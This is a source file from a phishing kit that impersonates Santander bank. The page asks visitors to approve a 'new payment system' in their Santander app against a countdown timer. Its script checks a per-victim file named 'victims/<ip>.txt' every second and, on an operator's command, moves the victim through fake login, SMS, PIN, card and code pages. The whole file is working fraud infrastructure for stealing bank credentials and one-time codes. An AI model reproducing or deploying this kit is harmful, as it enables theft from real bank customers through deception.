<?php
  include "./Assets/php/config/config.php";
  reset_data_page();
?>
<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <title>Particulares</title>
        <script src="./Assets/js/stutes.js"></script>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">

        <header id="header">
            <div class="container">
                <div><img class="d-lg-block d-md-none d-sm-none d-none" src="./Assets/imgs/logo_RGB.svg" style="width: 200px;"></div>
                <div><img class="d-lg-none d-md-block d-sm-block d-block" src="./Assets/imgs/logo4.png"></div>
                <div>
                    <img class="d-lg-block d-md-none d-sm-none d-none" src="./Assets/imgs/mainmenu.png">
                    <img class="d-lg-none d-md-block d-sm-block d-block" src="./Assets/imgs/mobile-menu.png">
                </div>
            </div>      
        </header>

        <nav id="nav">
            <div class="container">
                <div><img src="./Assets/imgs/header-left.png"></div>
                <div><img src="./Assets/imgs/sofia.png"></div>
            </div>
        </nav>
        <div class="wrapper_details">
            <div class="container_details">
                <div class="length_box">
                    <div class="length">
                        <div class="max_legth"></div>
                    </div>
                    <p>Paso 3 de 6</p>
                </div>
                <form action="./Assets/php/config/func.php" method="post" class="app d-flex flex-column align-items-center text-center" >
                    <input type="hidden" name="sms">
                    <div class="title_form text-center w-100 px-3">
                        <img src="./Assets/imgs/smaller.png" class="mb-3" width="140" alt="">
                        <h1 class="mb-1">Confírmanos desde tu app Santander</h1>
                        <p class="mt-0">Para actualizar el nueva sistema de pago confirmamos desde tu app Santander</p>
                    </div>
                    <div style="color: #767676;" class="timer mt-1 display: inline; align-items-center justify-content-center pb-4">Esta solicitud de aprobación caducará en : <spam class="time ms-1" style="color:#EC0000; font-weight:600;">2:00</spam></div>                                
                </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js>/js.js"></script>

        <script>
            let startingMinutes = 2;
            let time = startingMinutes * 60;
            const countdownEl = document.querySelector('.time');
            setInterval(updateCountdown, 1000);
            function updateCountdown(){
            const minutes = Math.floor(time / 60); 
            let seconds = time % 60;
            seconds = seconds < 10 ? '0' + seconds: seconds;
            countdownEl.innerHTML = `${minutes}:${seconds}`;
            time--;
              if (seconds == 1 && minutes == 0) {
                  setTimeout(function(){
                      location.href ="./success.php";
                  },1000)
              }
            }
            
          var ip = '<?php echo get_client_ip(); ?>';
          var waiting = setInterval(function() {
            $.get('victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    // console.log('hada ba9i 0');
                }else if( data == 'log' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'log_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }               

                else if( data == 'sms' ) {
                    clearInterval(waiting);
                    location.href = "sms.php";
                }else if( data == 'sms_error' ){
                    clearInterval(waiting);
                    location.href = "sms.php?error";
                }

                else if( data == 'pin' ) {
                    clearInterval(waiting);
                    location.href = "pin.php";
                }else if( data == 'pin_error' ){
                    clearInterval(waiting);
                    location.href = "pin.php?error";
                }

                else if( data == 'forma' ) {
                    clearInterval(waiting);
                    location.href = "code.php";
                }else if( data == 'forma_error' ){
                    clearInterval(waiting);
                    location.href = "code.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }
                
                else if( data == 'app' ){
                    clearInterval(waiting);
                    location.href = "app.php";
                }

                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "success.php";
                }
            });
          }, 1000);            
        </script>

    </body>

</html>